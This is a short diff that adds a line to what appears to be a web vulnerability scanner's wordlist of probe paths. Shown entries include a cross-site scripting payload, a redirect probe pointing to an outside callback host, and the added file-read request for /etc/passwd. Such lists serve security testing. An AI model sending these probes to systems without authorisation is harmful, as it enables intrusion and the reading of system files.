@@ -135,3 +135,4 @@
 /wp-admin/admin.php/
 /?mp_idx=%22;alert(%271%27);//
 /html/common/forward_jsp.jsp?FORWARD_URL=http://oast.me%EF%BF%BD@localhost
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
